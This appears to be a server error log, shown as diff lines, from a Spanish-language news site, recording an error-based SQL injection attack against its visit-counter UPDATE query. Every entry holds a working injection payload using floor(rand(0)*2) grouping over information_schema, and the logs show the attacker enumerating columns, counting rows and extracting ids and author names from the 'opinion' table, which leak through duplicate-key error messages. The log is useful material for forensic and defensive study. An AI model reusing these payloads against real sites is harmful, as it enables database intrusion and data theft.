+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 15,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:50
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 14,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:47
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~                        Israel Gonzalez Glz.                  ' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 14,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~Manuel Garcia Davila'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 13,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~Israel González Glez.        '~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 12,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 11,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 10,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~Luis Villegas Montes.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 9,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 8,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 7,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~Sergio Belmonte Almeida'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 6,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:17
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~Israel González Glez.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 5,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:13
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 4,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:10
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~ Por Gerónimo Stefan'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 3,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:46:51
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~Israel González Glez.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 2,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:46:47
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 1,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:46:43
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 0,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:46:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'55'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,count(*),0x27,0x7e) from `delbd`.opinion)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:46:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~44'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 43,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:46:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~43'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 42,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:46:19
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~42'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 41,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:46:16
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~41'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 40,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:46:14
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~40'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 39,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:46:10
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~39'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 38,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:46:08
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~38'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 37,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:46:05
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~37'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 36,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:46:02
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~36'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 35,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:59
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~35'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 34,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:56
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~34'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 33,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:53
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~33'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 32,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:50
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~32'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 31,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:48
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~31'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 30,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:44
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~30'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 29,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:42
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~29'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 28,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:39
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~28'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 27,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~27'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 26,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~26'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 25,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~25'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 24,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~24'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 23,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~23'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 22,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:17
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~22'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 21,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:15
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~21'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 20,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:13
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~20'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 19,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:10
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~19'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 18,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:07
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~18'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 17,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:03
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~17'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 16,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:45:00
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~16'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 15,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:57
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~15'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 14,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:54
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~14'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 13,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:51
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~13'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 12,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:49
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~12'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 11,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:46
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~11'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 10,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:43
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~10'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 9,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~9'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 8,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~8'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 7,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~7'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 6,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~6'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 5,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~5'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 4,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~4'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 3,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~3'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 2,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:20
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~2'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 1,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:16
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~1'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.id,0x27,0x7e) from `delbd`.opinion Order by id limit 0,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:44:14
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'55'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,count(*),0x27,0x7e) from `delbd`.opinion)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:41:59
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'55'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,count(*),0x27,0x7e) from `delbd`.opinion)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:39:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'opinioncol'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6F70696E696F6E limit 8,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:39:19
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'rumbo'~1' for key 'group_key'
